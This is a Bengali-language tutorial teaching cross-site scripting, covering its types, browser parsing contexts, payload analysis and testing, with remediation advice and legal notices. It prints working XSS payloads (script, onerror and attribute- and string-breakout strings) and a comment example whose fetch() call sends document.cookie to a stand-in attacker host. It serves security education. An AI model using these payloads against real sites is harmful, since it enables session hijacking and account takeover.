    Cross-Site Scripting (XSS) ডকুমেন্টেশন

    বাংলাদেশের শিক্ষার্থীদের জন্য তৈরি, সম্পূর্ণ বাংলায় লেখা একটি Basic থেকে Advanced XSS শেখার গাইড — থিওরি, পেলোড অ্যানালাইসিস, Burp Suite দিয়ে ম্যানুয়াল টেস্টিং, সিকিউর কোডিং এবং বাগ বাউন্টি ওয়ার্কফ্লো পর্যন্ত, ১৫টি অধ্যায়ে সাজানো।

    XSS নিয়ে সংক্ষিপ্ত কথা

    Cross-Site Scripting (XSS) ওয়েব অ্যাপ্লিকেশনের অন্যতম পুরনো ও এখনও সবচেয়ে বেশি পাওয়া যাওয়া vulnerability class-গুলোর একটি। এটি ঘটে যখন একটি ওয়েব অ্যাপ্লিকেশন ব্যবহারকারীর নিয়ন্ত্রণে থাকা ডেটা যথাযথভাবে যাচাই বা encode না করে সরাসরি ব্রাউজারে HTML বা JavaScript হিসেবে render করে ফেলে। ফলে আক্রমণকারী ভিকটিমের ব্রাউজারের মধ্যে নিজের তৈরি করা script চালানোর সুযোগ পায় — এমন একটি প্রেক্ষাপটে, যেখানে ব্রাউজার সেই script-কে আসল ওয়েবসাইটের নিজস্ব কোড বলেই বিশ্বাস করে।

    এই ডকুমেন্টেশনে ধাপে ধাপে দেখানো হয়েছে — XSS কেন ঘটে, কীভাবে browser HTML/JS parse করে, Reflected/Stored/DOM-based/Blind/Mutation XSS-এর পার্থক্য, কনটেক্সট অনুযায়ী পেলোড নির্বাচন, এনকোডিং ও স্যানিটাইজেশন, Burp Suite দিয়ে বাস্তব ম্যানুয়াল টেস্টিং, আধুনিক ফ্রেমওয়ার্কে (React/Angular/Vue) XSS-এর ঝুঁকি, impact assessment, secure coding, এবং সবশেষে একটি দায়িত্বশীল bug bounty workflow।

    XSS এর ভিত্তি (XSS Fundamentals)

    Cross-Site Scripting আসলে কী, কেন ঘটে এবং অন্যান্য vulnerability থেকে এটি কীভাবে আলাদা — এই অধ্যায়ে সেই ভিত্তিটা তৈরি হবে।

    ⚖️

    আইনি নোটিশ: এই অধ্যায়ে উল্লেখিত যেকোনো ধারণা, উদাহরণ বা পেলোড শুধুমাত্র নিজের তৈরি lab, অনুমোদিত training platform (PortSwigger, OWASP Juice Shop, DVWA ইত্যাদি) অথবা স্পষ্টভাবে scope-ভুক্ত bug bounty প্রোগ্রামে প্রয়োগ করুন। অনুমতি ছাড়া কোনো সিস্টেমে প্রয়োগ করলে তা আইনত দণ্ডনীয় অপরাধ।

    XSS কী এবং কেন ঘটে

    সংজ্ঞা: Cross-Site Scripting (XSS) হলো একটি client-side vulnerability, যেখানে একটি ওয়েব অ্যাপ্লিকেশন ব্যবহারকারীর নিয়ন্ত্রণে থাকা ডেটা যথাযথভাবে validate/encode না করে সরাসরি পৃষ্ঠায় HTML বা JavaScript হিসেবে render করে ফেলে। এর ফলে আক্রমণকারীর দেওয়া script, ভিকটিমের ব্রাউজারে, ভিকটিমের নিজস্ব সেশনের মধ্যেই চলে — ঠিক যেন সেটি ওয়েবসাইটেরই নিজস্ব কোড।

    কেন ঘটে: আধুনিক ওয়েব অ্যাপ্লিকেশন প্রচুর dynamic content তৈরি করে — ইউজারের নাম, কমেন্ট, সার্চ কোয়েরি, প্রোফাইল তথ্য ইত্যাদি পৃষ্ঠায় বসিয়ে দেখায়। যখন এই "বসানো" (rendering) প্রক্রিয়ায় ডেটা ও কোডের মধ্যে স্পষ্ট পার্থক্য রাখা হয় না, তখন ইউজারের দেওয়া সাধারণ টেক্সট ব্রাউজারের চোখে "নির্বাহযোগ্য কোড" হয়ে যেতে পারে।

    একটি সহজ উদাহরণ (Beginner-friendly)

    ধরা যাক একটি সার্চ পেজ ইউজারের সার্চ টার্ম ফিরিয়ে দেখায়:

    Vulnerable backend কোড (ধারণাগত)
    <p>আপনি খুঁজেছেন: {{searchTerm}}</p>
// searchTerm সরাসরি, কোনো encoding ছাড়াই, HTML-এ বসে যাচ্ছে

    স্বাভাবিক ইউজার যদি laptop লেখে, পৃষ্ঠায় দেখা যাবে: "আপনি খুঁজেছেন: laptop"। কিন্তু যদি কেউ সার্চ বক্সে লেখে:

    Lab-only proof-of-execution payload
    <script>alert('XSS')</script>

    তাহলে ব্রাউজার সেটিকে টেক্সট না ভেবে একটি <script> ট্যাগ হিসেবে পার্স করবে এবং ভেতরের JavaScript চালাবে — ফলে একটি alert বক্স দেখা যাবে। এই alert() নিজে ক্ষতিকর কিছু না, কিন্তু এটি প্রমাণ করে যে attacker-controlled টেক্সট, ব্রাউজারে কোড হিসেবে execute হচ্ছে — যেটিই আসল সমস্যা। এই একই জায়গায় একজন দূষিত আক্রমণকারী session cookie চুরি, phishing form বসানো বা পুরো পেজ defacement-এর মতো কোড বসাতে পারত।

    Browser কীভাবে HTML ও JavaScript Process করে

    XSS বোঝার জন্য ব্রাউজারের কাজ করার ধরন বোঝা জরুরি। যখন ব্রাউজার একটি HTML document পায়, সে উপর থেকে নিচে পড়ে একটি DOM (Document Object Model) tree তৈরি করে — পৃষ্ঠার প্রতিটি element, attribute ও টেক্সট সেই tree-র অংশ হয়ে যায়। যখনই পার্সার <script> ট্যাগ, একটি event-handler attribute (যেমন onerror), অথবা javascript: URL-এর মতো কিছু খুঁজে পায়, সে সেই কোড JavaScript engine-এ পাঠিয়ে execute করে।

    গুরুত্বপূর্ণ বিষয় হলো — ব্রাউজার জানে না কোন HTML "legitimate developer-এর লেখা" আর কোন HTML "ইউজার ইনপুট থেকে এসেছে"। সে শুধু সিনট্যাক্স দেখে পার্স করে। তাই যদি ইউজার ইনপুট এমনভাবে পৃষ্ঠায় বসে যায় যা একটি নতুন ট্যাগ বা attribute তৈরি করে ফেলে, ব্রাউজার সেটিকে ঠিক ততটাই বিশ্বাস করবে যতটা সে আসল কোডকে করত।

    Same-Origin Policy (SOP)-এর ভূমিকা

    Same-Origin Policy ব্রাউজারের একটি মৌলিক নিরাপত্তা নীতি, যা একটি origin (protocol + domain + port)-এর script-কে অন্য origin-এর ডেটা পড়তে/পরিবর্তন করতে বাধা দেয়। সাধারণ অবস্থায় evil.com-এর স্ক্রিপ্ট bank.com-এর cookie বা DOM পড়তে পারে না। XSS এই নিরাপত্তা দেয়ালকে এড়িয়ে যায় — কারণ attacker-এর কোড ভিকটিমের ব্রাউজারে, target সাইটের নিজস্ব origin থেকেই চলে, তাই SOP সেই কোডকে "ওই সাইটেরই" কোড হিসেবে গণ্য করে এবং পুরোপুরি অনুমতি দেয়।

    User-Controlled বনাম Server-Controlled Data

    User-controlled data হলো যেকোনো মান যা সরাসরি বা পরোক্ষভাবে ইউজার (attacker-সহ) নিয়ন্ত্রণ করতে পারে — form field, URL parameter, cookie, HTTP header (Referer, User-Agent), JSON body, এমনকি file metadata বা third-party API response (যদি সেই API-ও কোনোভাবে user input গ্রহণ করে)। Server-controlled data এমন মান যা ব্যবহারকারী সরাসরি পরিবর্তন করতে পারে না — যেমন সার্ভারে hardcode করা constant।

    XSS সবসময় ঘটে যখন user-controlled data, output-এ পৌঁছানোর সময় এমন context-এ বসে যায় যেখানে ব্রাউজার তাকে কোড হিসেবে পার্স করে। মনে রাখা জরুরি — "user-controlled" মানেই শুধু দৃশ্যমান input field নয়; cookie, hidden field, এমনকি filename-ও user-controlled হতে পারে।

    Source, Sink এবং Execution Context

    XSS অ্যানালাইসিসে তিনটি শব্দ বারবার আসবে:

    Source

    যেখান থেকে attacker-controlled ডেটা অ্যাপ্লিকেশনে প্রবেশ করে — URL parameter, form input, cookie, API response ইত্যাদি।

    Sink

    যেখানে সেই ডেটা এমনভাবে ব্যবহৃত হয় যা code execution ঘটাতে পারে — যেমন innerHTML, document.write(), বা সরাসরি HTML output।

    Execution Context

    Sink-এর ঠিক আশেপাশের syntax পরিবেশ — HTML body, একটি attribute, একটি JS string, বা একটি URL — যা নির্ধারণ করে কোন ধরনের payload কাজ করবে।

    একটি vulnerability তখনই exploitable হয় যখন source থেকে sink পর্যন্ত ডেটার path-এ কোনো যথাযথ sanitization/encoding থাকে না — একে বলা হয় tainted data flow।

    লক্ষণীয় যে XSS প্রায়ই CSRF protection বাইপাস করার একটি শক্তিশালী হাতিয়ার হয়ে ওঠে — কারণ XSS থাকলে attacker ভিকটিমের ব্রাউজার থেকেই, ভিকটিমের নিজস্ব session ব্যবহার করে, যেকোনো request পাঠাতে পারে, যা CSRF token-ও পড়ে ফেলতে সক্ষম।

    XSS-এর সম্ভাব্য Impact

    • Session hijacking: সেশন কুকি বা টোকেন চুরি করে ভিকটিমের অ্যাকাউন্টে প্রবেশ।
    • Credential theft: আসল লগইন ফর্মের মতো দেখতে ভুয়া ফর্ম বসিয়ে পাসওয়ার্ড হাতানো (phishing-in-page)।
    • Account takeover: ভিকটিমের সেশন ব্যবহার করে ইমেইল/পাসওয়ার্ড পরিবর্তনের মতো sensitive অ্যাকশন চালানো।
    • Defacement: পৃষ্ঠার বিষয়বস্তু পরিবর্তন করে দেওয়া।
    • Malware/drive-by delivery: ভিকটিমের ব্রাউজারে অতিরিক্ত ক্ষতিকর স্ক্রিপ্ট লোড করানো।
    • Internal network reconnaissance: ভিকটিমের ব্রাউজার থেকে internal/admin পেজে request পাঠিয়ে তথ্য সংগ্রহ।

    আসল impact নির্ভর করে — ভিকটিম কে (সাধারণ ইউজার নাকি admin), application কী ধরনের sensitive অ্যাকশন অনুমতি দেয়, এবং session security কতটা শক্তিশালী (যেমন HttpOnly cookie ব্যবহার হচ্ছে কি না) তার উপর।

    নিচের কোডে কোন ভ্যারিয়েবলটি "source" এবং কোনটি "sink"? ব্যাখ্যা করুন কেন এটি একটি tainted data flow তৈরি করছে।

    var name = new URLSearchParams(location.search).get("name");
document.getElementById("greeting").innerHTML = "স্বাগতম, " + name;

    সারসংক্ষেপ

    XSS ঘটে যখন user-controlled ডেটা, যথাযথ encoding ছাড়া, ব্রাউজারে HTML/JavaScript হিসেবে render হয়। এটি client-side-এ, ভিকটিমের ব্রাউজারে execute হয় — যা একে SQL Injection (server-side) ও CSRF (কোড ইনজেকশন ছাড়াই অ্যাকশন trigger) থেকে আলাদা করে। Source→Sink→Context ফ্রেমওয়ার্ক পরবর্তী সব অধ্যায়ে বারবার ব্যবহৃত হবে।

    HTML, JavaScript and Browser Parsing

    XSS পেলোড কাজ করে কি না তা নির্ভর করে ব্রাউজার ঠিক কীভাবে HTML/JS parse করছে তার উপর — এই অধ্যায়ে সেই প্রক্রিয়াটা ভেঙে দেখানো হয়েছে।

    ⚖️

    আইনি নোটিশ: এখানে দেখানো সব উদাহরণ শুধুমাত্র নিজের lab বা অনুমোদিত পরিবেশে পরীক্ষা করুন। অনুমতি ছাড়া অন্য কোনো সিস্টেমে প্রয়োগ নিষিদ্ধ ও আইনত দণ্ডনীয়।

    HTML Parsing ও DOM Tree

    ব্রাউজার যখন একটি HTML response পায়, সে টোকেন-বাই-টোকেন পার্স করে একটি DOM tree তৈরি করে — ট্যাগ, attribute, টেক্সট নোড — সবকিছু একটি হায়ারার্কিক্যাল স্ট্রাকচারে সাজানো হয়। এই পার্সিং প্রক্রিয়া streaming — অর্থাৎ পুরো document ডাউনলোড হওয়ার আগেই parser কাজ শুরু করে দেয়, এবং যখনই একটি <script> ট্যাগ পাওয়া যায়, সাধারণত parsing থেমে গিয়ে সেই script execute হয় (যদি না async/defer থাকে)।

    JavaScript Execution Context

    প্রতিটি script ব্রাউজারের একটি global execution context-এ চলে, যেখানে তার window, document, cookie, local storage ইত্যাদির সম্পূর্ণ অ্যাক্সেস থাকে — ঠিক একই অ্যাক্সেস যা পৃষ্ঠার legitimate স্ক্রিপ্টের থাকে। এজন্যই একবার কোনো attacker script execute হতে পারলে, সে ওই পৃষ্ঠার প্রায় সবকিছুর সাথে interact করতে পারে।

    বিভিন্ন Parsing/Rendering Context

    XSS পেলোড লেখার আগে বোঝা জরুরি, ইউজার ইনপুট ঠিক কোন "context"-এ বসছে — কারণ প্রতিটি context-এর নিজস্ব escape নিয়ম আলাদা। অধ্যায় ৫-এ এটি বিস্তারিতভাবে আলোচিত হবে; এখানে একটি সংক্ষিপ্ত পরিচিতি দেওয়া হলো।

    ১. HTML Text Context

    ইনপুট সরাসরি দুটি ট্যাগের মাঝের টেক্সট হিসেবে বসে।

    উদাহরণ
    <p>আপনার মন্তব্য: INPUT_HERE</p>

    এখানে input যদি <script>...</script> হয়, নতুন ট্যাগ সরাসরি তৈরি হয়ে যাবে — কোনো escape প্রয়োজন নেই।

    ২. Attribute Context

    ইনপুট একটি HTML attribute-এর মান হিসেবে বসে।

    উদাহরণ
    <input type="text" value="INPUT_HERE">

    এখানে প্রথমে quote (") বন্ধ করে attribute-টি শেষ করতে হয়, তারপর একটি নতুন attribute (যেমন onmouseover) বা ট্যাগ শুরু করা যায়।

    ৩. JavaScript String Context

    ইনপুট একটি inline <script>-এর ভেতরে, একটি JS string literal-এর মধ্যে বসে।

    উদাহরণ
    <script>var user = "INPUT_HERE";</script>

    এখানে string quote বন্ধ করে সরাসরি JavaScript statement যোগ করা যায়, অথবা সেমিকোলনসহ নতুন statement বসানো যায়।

    ৪. URL Context

    ইনপুট একটি লিঙ্কের href বা src-এর মান হিসেবে বসে।

    উদাহরণ
    <a href="INPUT_HERE">এখানে ক্লিক করুন</a>

    যদি filtering না থাকে, এখানে javascript: স্কিম ব্যবহার করে একটি "URL"-কে সরাসরি JavaScript execution-এ পরিণত করা সম্ভব।

    ৫. CSS Context

    ইনপুট একটি <style> ব্লক বা style attribute-এর ভেতরে বসে। আধুনিক ব্রাউজারে CSS থেকে সরাসরি JS execution খুবই সীমিত হয়ে গেছে, কিন্তু পুরনো ব্রাউজার বা নির্দিষ্ট CSS feature (যেমন expression(), শুধু পুরনো IE-তে) এখনও আলোচনার যোগ্য একটি ঐতিহাসিক প্রসঙ্গ।

    বিপজ্জনক DOM API ও তাদের ঝুঁকি

    APIআচরণঝুঁকি
    innerHTMLস্ট্রিংকে HTML হিসেবে পার্স করে DOM-এ বসায়খুব বেশি — script/event handler সহ যেকোনো HTML চালাতে পারে
    outerHTMLelement নিজেই HTML স্ট্রিং দিয়ে প্রতিস্থাপিত হয়innerHTML-এর মতোই বিপজ্জনক
    document.write() / document.writeln()পার্সিং স্ট্রিমে সরাসরি HTML লেখেউচ্চ — legacy কোডে প্রায়ই পাওয়া যায়, context অনুযায়ী বিভিন্নভাবে exploit করা যায়
    eval()একটি স্ট্রিংকে সরাসরি JavaScript কোড হিসেবে execute করেসর্বোচ্চ — পুরো JS execution ক্ষমতা স্ট্রিং থেকে আসে
    setTimeout()/setInterval() (স্ট্রিং আর্গুমেন্টসহ)স্ট্রিং আর্গুমেন্ট দিলে তা eval()-এর মতো আচরণ করেউচ্চ, কিন্তু কম ব্যবহৃত (function reference দিয়ে কল করলে নিরাপদ)
    textContent / innerTextস্ট্রিংকে plain text হিসেবে বসায়, HTML পার্স করে নানিরাপদ — XSS sink নয়

    Safe বনাম Unsafe কোডের তুলনা

    ❌ Unsafe

    element.innerHTML = userComment;

    userComment-এ থাকা যেকোনো HTML ট্যাগ সরাসরি parse ও execute হবে।

    ✅ Safe

    element.textContent = userComment;

    userComment যতই HTML-এর মতো দেখাক, এটি শুধু plain text হিসেবে দেখানো হবে — কোনো ট্যাগ তৈরি হবে না।

    XSS এর প্রকারভেদ (Types of XSS)

    Reflected, Stored, DOM-based, Blind এবং Mutation XSS — প্রতিটির root cause, data flow, নিরাপদ lab উদাহরণ ও remediation।

    ১. Reflected XSS

    Root cause: ইউজারের দেওয়া ইনপুট (সাধারণত URL parameter বা form field) সার্ভার সেই একই request-এর response-এ, কোনো encoding ছাড়াই, সরাসরি ফিরিয়ে দেয়।

    Data flow: Request → Server (কোনো স্টোরেজ ছাড়াই) → Response-এ সরাসরি প্রতিফলিত (reflected) → ব্রাউজার parse করে execute করে।

    NoteBoardMock — সার্চ পেজ
    Request:  GET /search?q=laptop
Response: <p>ফলাফল: laptop</p>

Test input: GET /search?q=<script>alert(document.domain)</script>
Response:   <p>ফলাফল: <script>alert(document.domain)</script></p>

    Testing: একটি unique marker string (যেমন xsstest123) পাঠিয়ে response-এ সেটি কোন জায়গায়, কোন context-এ (HTML/attribute/JS) প্রতিফলিত হচ্ছে তা পর্যবেক্ষণ করুন, এরপর সেই context-উপযোগী payload চেষ্টা করুন।

    Expected result: Marker সহ payload response-এ হুবহু বা escape-ছাড়া দেখা গেলে, এবং সেই payload ব্রাউজারে execute হলে (যেমন alert বক্স আসা) vulnerability নিশ্চিত হয়।

    Impact: Attacker-কে সাধারণত ভিকটিমকে একটি বিশেষভাবে তৈরি লিঙ্কে ক্লিক করাতে হয় (social engineering/phishing লিঙ্ক) — তাই এটি "one-time", ভিকটিম-নির্দিষ্ট আক্রমণ, কিন্তু session hijacking-এর জন্য যথেষ্ট শক্তিশালী।

    Remediation: Output encoding (context-aware), input validation, এবং Content-Security-Policy।

    ২. Stored XSS

    Root cause: আক্রমণকারীর পেলোড সার্ভারে (database, file, log ইত্যাদিতে) স্থায়ীভাবে সংরক্ষিত হয়, এবং পরবর্তীতে অন্য ব্যবহারকারীরা যখন সেই পৃষ্ঠা দেখেন, তখন তাদের ব্রাউজারে execute হয়।

    Data flow: Request (পেলোডসহ কমেন্ট/প্রোফাইল তথ্য) → সার্ভার ডেটা সংরক্ষণ করে → পরে, অন্য ইউজারের request-এর response-এ সেই ডেটা ফিরিয়ে দেওয়া হয় → execute হয়।

    NoteBoardMock — কমেন্ট বক্স
    POST /comment
body: comment=<script>fetch('https://attacker-lab.local/log?c='+document.cookie)</script>

→ পরে যেকোনো ভিজিটর কমেন্ট পেজ খুললেই উপরের script তাদের ব্রাউজারে চলবে।
    ⚠️

    উপরের fetch()-ভিত্তিক উদাহরণটি শুধুমাত্র ধারণাগত ব্যাখ্যার জন্য — এটি কখনো বাস্তব ভিকটিমের ডেটার উপর প্রয়োগ করা যাবে না। নিজের lab-এ প্রমাণ করতে চাইলে শুধু harmless alert(document.domain) ব্যবহার করাই যথেষ্ট।

    Testing: এমন input field খুঁজুন যা persist হয় (কমেন্ট, প্রোফাইল বায়ো, রিভিউ, ফাইল মেটাডেটা, সাপোর্ট টিকিট)। Payload জমা দেওয়ার পর, সেই পেজ reload করে বা অন্য অ্যাকাউন্ট/ইনকগনিটো সেশন থেকে দেখে যাচাই করুন।

    Impact: Reflected-এর চেয়ে অনেক বেশি বিপজ্জনক — কারণ ভিকটিমকে কোনো বিশেষ লিঙ্কে ক্লিক করতে হয় না, শুধু স্বাভাবিকভাবে পৃষ্ঠা ভিজিট করলেই আক্রান্ত হয়। যদি admin panel-এ এভাবে কমেন্ট দেখানো হয়, একজন সাধারণ ইউজার admin-কে পর্যন্ত আক্রান্ত করতে পারে।

    Remediation: স্টোরেজের সময় নয়, বরং আউটপুট করার সময় context-aware encoding করা (output encoding সবসময় শেষ ধাপে হওয়া উচিত); rich text প্রয়োজন হলে allowlist-based HTML sanitizer (DOMPurify)।

    ৩. DOM-Based XSS

    Root cause: এখানে সার্ভার কোনোভাবেই জড়িত নয় — পুরো vulnerability সম্পূর্ণভাবে client-side JavaScript-এর মধ্যে ঘটে, যখন client-side কোড নিজেই attacker-controlled ডেটা (URL, location.hash, document.referrer) পড়ে একটি বিপজ্জনক sink-এ বসিয়ে দেয়।

    Data flow: Browser URL/DOM (source) → client-side JavaScript পড়ে → বিপজ্জনক sink-এ বসে (যেমন innerHTML) → execute হয় — এই পুরো প্রক্রিয়া সার্ভারের response HTML-এ কখনো দৃশ্যমান হয় না।

    NoteBoardMock — ক্লায়েন্ট-সাইড গ্রিটিং
    // পেজের নিজস্ব JavaScript, যা সার্ভার থেকে পাল্টায় না:
var name = decodeURIComponent(location.hash.slice(1));
document.getElementById("greeting").innerHTML = "স্বাগতম, " + name;

Test URL: https://example.com/welcome#<img src=x onerror=alert(1)>
→ সার্ভার এই hash অংশ কখনো দেখেও না (hash সার্ভারে পাঠানো হয় না),
  কিন্তু client-side JS সরাসরি সেটি পড়ে innerHTML-এ বসিয়ে দেয়।

    Testing: সার্ভার-সাইড reflected XSS-এর মতো payload পাঠিয়ে কাজ না করলেও, ব্রাউজার DevTools-এ JavaScript সোর্স পড়ে দেখুন location, document.URL, document.referrer কোথায় ব্যবহৃত হচ্ছে, এবং সেই ভ্যালু কোন sink-এ যাচ্ছে। Chrome DevTools-এর DOM Invader (অধ্যায় ৭) এই কাজ স্বয়ংক্রিয়ভাবে সহজ করে দেয়।

    গুরুত্বপূর্ণ পার্থক্য: যেহেতু payload সার্ভারে কখনো পৌঁছায়ও না (hash fragment সার্ভারে পাঠানো হয় না), তাই server-side লগ/WAF-এ এই আক্রমণের কোনো চিহ্ন নাও থাকতে পারে — শুধুমাত্র client-side কোড অডিট করেই এটি ধরা সম্ভব।

    Remediation: Client-side-এও output encoding/sanitization প্রযোজ্য — innerHTML-এর বদলে textContent, অথবা URL/hash থেকে আসা ডেটা ব্যবহারের আগে sanitize করা।

    ৪. Blind XSS

    Root cause: এটি মূলত Stored XSS-এরই একটি বিশেষ রূপ, যেখানে payload এমন একটি জায়গায় জমা হয় যা attacker নিজে সরাসরি দেখতে পায় না — বরং একজন ভিন্ন, প্রায়ই higher-privilege ইউজার (যেমন admin, support agent, log-viewer) সেটি পরে দেখেন।

    সাধারণ জায়গা: Contact form, support ticket, feedback form, user-agent string (যা admin dashboard-এর analytics-এ দেখানো হয়), job application form।

    নিরাপদ Blind XSS testing পদ্ধতি
    Payload (একটি authorized blind-XSS collector service ব্যবহার করে, নিজের lab-এ):

→ যখনই কোনো admin/ব্যাকএন্ড ইউজার সেই ডেটা দেখেন, script লোড হয় এবং
  collector-এ একটি নোটিফিকেশন পাঠায় — "এই payload execute হয়েছে, সময়
  এবং পেজের তথ্যসহ"।
    ⚠️

    Blind XSS টেস্টিং শুধুমাত্র নিজের তৈরি/নিয়ন্ত্রিত collector endpoint এবং স্পষ্টভাবে অনুমোদিত scope-এ করুন। অপরিচিত বা third-party collector ব্যবহার করলে আপনার সংগ্রহ করা তথ্য আপনার নিয়ন্ত্রণের বাইরে চলে যেতে পারে — এটি নিজেই একটি ডেটা প্রাইভেসি ঝুঁকি।

    Testing: Blind XSS-এর ফলাফল তাৎক্ষণিকভাবে দেখা যায় না — মিনিট, ঘণ্টা, এমনকি দিন পর collector-এ notification আসতে পারে, কারণ এটি নির্ভর করে কখন কোনো admin/এজেন্ট সেই ডেটা দেখবেন তার উপর।

    Impact: সাধারণত সবচেয়ে বেশি, কারণ ভিকটিম প্রায়ই admin বা high-privilege ইউজার হয় — যার সেশন হাইজ্যাক করলে সম্পূর্ণ অ্যাপ্লিকেশন নিয়ন্ত্রণে চলে আসতে পারে।

    Remediation: Stored XSS-এর মতোই — output encoding সব জায়গায়, admin panel/internal টুল-সহ। Internal/admin interface-কে "কম ঝুঁকিপূর্ণ" ধরে কম sanitize করা একটি সাধারণ ভুল।

    ৫. Mutation XSS (mXSS)

    Root cause: এটি একটি সূক্ষ্ম ও advanced ধরনের XSS, যেখানে payload নিজে initial sanitization/parsing পাস করে যায় (কারণ এটি প্রাথমিকভাবে harmless দেখায়), কিন্তু ব্রাউজার যখন সেই HTML-কে পুনরায় parse বা serialize করে (যেমন innerHTML পড়ে আবার লেখার সময়), তখন HTML parser-এর নিজস্ব "normalization" আচরণের কারণে একটি নতুন, বিপজ্জনক structure তৈরি হয়ে যায়।

    কেন ঘটে: Sanitizer একটি HTML string parse করে "safe" মনে করে ফেরত দেয়, কিন্তু sanitizer ও পরবর্তী consumer (ব্রাউজারের নিজস্ব parser) একই HTML স্ট্রিং-কে ভিন্নভাবে interpret করতে পারে — বিশেষ করে nested বা malformed markup-এর ক্ষেত্রে। এই "parsing-এর ভিন্নতা" ফাঁকটাই mXSS exploit করে।

    ধারণাগত উদাহরণ (সরলীকৃত)
    // Sanitizer-কে দেওয়া ইনপুট (প্রাথমিকভাবে নিরীহ দেখায়):
<listing><img src=1 onerror=alert(1)></listing>

// কিছু পুরনো sanitizer/parser কম্বিনেশনে, innerHTML read-back-এর পর
// <listing> ট্যাগের বিশেষ parsing আচরণের কারণে ভেতরের কনটেন্ট
// এমনভাবে পুনর্গঠিত হতে পারে যা সরাসরি onerror handler সক্রিয় করে দেয়।

    Testing: Mutation XSS শনাক্ত করা কঠিন এবং এর জন্য sanitizer-এর internal আচরণ গভীরভাবে বোঝা প্রয়োজন — সাধারণত automated scanner বা নির্দিষ্ট mXSS টেস্ট-কেস সেট (যেমন একাডেমিক গবেষণা পেপার থেকে নেওয়া) ব্যবহার করা হয়, ম্যানুয়াল ব্ল্যাক-বক্স টেস্টিং দিয়ে এটি প্রায়ই মিস হয়ে যায়।

    Impact: Stored/DOM XSS-এর সমতুল্য — কারণ শেষ পর্যন্ত এটিও arbitrary script execution ঘটায়; পার্থক্য শুধু root cause-এ।

    Remediation: আপ-টু-ডেট, সুপরিচিত sanitizer লাইব্রেরি (যেমন সর্বশেষ সংস্করণের DOMPurify) ব্যবহার করা, যা mXSS প্যাটার্নের বিরুদ্ধে সক্রিয়ভাবে পরীক্ষিত ও patch করা হয়; নিজস্ব regex-ভিত্তিক sanitizer কখনো লেখা উচিত নয়।

    অনুশীলন

    নিচের প্রতিটি দৃশ্যপট কোন ধরনের XSS, ব্যাখ্যাসহ বলুন:

    1. একটি URL-এ পেলোড পাঠানোর সাথে সাথেই response-এ সেটি প্রতিফলিত হয়, কিন্তু রিলোড করলে আর থাকে না।
    2. একটি প্রোফাইল বায়োতে পেলোড সেভ করার পর, এক সপ্তাহ পরে একজন সাপোর্ট এজেন্ট সেটি দেখলে notification আসে।
    3. সার্ভার response-এ কোনো পেলোড নেই, কিন্তু browser console-এ দেখা যায় JavaScript location.hash পড়ে innerHTML-এ বসাচ্ছে।

    সারসংক্ষেপ

    XSS-এর পাঁচটি প্রধান ধরন তাদের data flow অনুযায়ী আলাদা — reflected (তাৎক্ষণিক, non-persistent), stored (persistent, সবার জন্য দৃশ্যমান), DOM-based (সম্পূর্ণ client-side, সার্ভার অজান্তে), blind (persistent কিন্তু attacker নিজে দেখেন না), এবং mutation (parser-এর আচরণগত ফাঁক কাজে লাগায়)। প্রতিটির জন্য আলাদা testing ও detection কৌশল প্রয়োজন।

    ২. HTML Context Payloads

    Tag breakout

    </textarea><script>alert(1)</script>

    যখন input একটি <textarea>-এর ভেতরে বসে, প্রথমে closing ট্যাগ দিয়ে সেটি থেকে "বের হয়ে" নতুন script শুরু করতে হয়।

    Comment breakout

    --><script>alert(1)</script><!--

    যদি input একটি HTML comment-এর (<!-- ... -->) ভেতরে বসে, প্রথমে comment বন্ধ করতে হয়।

    ৩. Attribute Context Payloads

    Double-quote attribute breakout

Payload:        "><script>alert(1)</script>
ফলাফল:          <input value=""><script>alert(1)</script>>
    Quote ছাড়াই নতুন attribute যোগ (unquoted attribute context)
    Input context:  <input value=INPUT>
Payload:        x onmouseover=alert(1)
ফলাফল:          <input value=x onmouseover=alert(1)>

    ব্যাখ্যা: যদি developer attribute-এর মান quote দিয়ে না ঘেরেন (unquoted attribute — dangerous practice), তাহলে শুধু একটি স্পেস দিয়েই নতুন attribute শুরু করা যায়, কোনো quote breakout লাগে না। কেন কাজ নাও করতে পারে: যদি developer সবসময় quote ব্যবহার করেন এবং quote character encode করেন (" → &#34;)।

    ৪. JavaScript String Context Payloads

    JS string breakout

Payload:        ";alert(1);//

    Reflection Point শনাক্ত করা

    প্রথম ধাপ হলো — অ্যাপ্লিকেশনের কোন কোন input (URL parameter, form field, header, cookie) output-এ কোথাও "প্রতিফলিত" (reflected) হয় তা খুঁজে বের করা। এর জন্য একটি unique, harmless marker string পাঠানো সবচেয়ে নির্ভরযোগ্য পদ্ধতি।

    Marker-ভিত্তিক শনাক্তকরণ
    প্রতিটি input-এ পাঠান: zzXSSmarker12345zz

তারপর response-এ (Ctrl+F দিয়ে) "zzXSSmarker12345zz" খুঁজুন —
কোথায় কোথায় এটি দেখা যাচ্ছে তা নোট করুন।

    Unique marker ব্যবহারের কারণ: সাধারণ শব্দ (যেমন test) পেজে আগে থেকেই থাকতে পারে, যা false positive তৈরি করবে। একটি random, dictionary-তে না থাকা স্ট্রিং নিশ্চিত করে যে reflection আসলে আপনার input থেকেই আসছে।

    Context অনুযায়ী বিশ্লেষণ

    Marker যেখানে দেখা যাচ্ছে, সেই জায়গার ঠিক আশেপাশের raw HTML (Browser DevTools-এর "View Page Source" বা Network tab-এর raw response ব্যবহার করুন, rendered DOM না — কারণ ব্রাউজার ইতিমধ্যে কিছু normalize করে ফেলতে পারে) দেখে context নির্ধারণ করুন।

    HTML Context চেনার উপায়

    Marker দুটি ট্যাগের মাঝে, কোনো quote বা বিশেষ সিনট্যাক্সের মধ্যে না — যেমন <p>zzXSSmarker12345zz</p>।

    Attribute Context চেনার উপায়

    Marker একটি attr="..."-এর ভেতরে — যেমন <input value="zzXSSmarker12345zz">। লক্ষ্য করুন quote single না double।

    JavaScript String Context চেনার উপায়

    Marker একটি <script> ব্লকের ভেতরে, quote দিয়ে ঘেরা একটি variable-এর মান হিসেবে — যেমন var x = "zzXSSmarker12345zz";।

    URL Context চেনার উপায়

    Marker একটি href/src attribute-এর সম্পূর্ণ বা আংশিক মান হিসেবে বসছে।

    Nested Contexts — একাধিক স্তরের জটিলতা

    কখনো কখনো input একাধিক স্তরের মধ্যে নেস্টেড থাকে — যেমন একটি JavaScript string-এর ভেতরে, যা নিজে একটি HTML attribute-এর ভেতরে বসে আছে (inline event handler attribute, যেমন onclick="doSearch('INPUT')")। এখানে payload-কে প্রথমে JS string থেকে বের হতে হয়, তারপর প্রয়োজনে attribute থেকেও।

    Nested context উদাহরণ
    আসল HTML:
<button onclick="search('INPUT')">খুঁজুন</button>

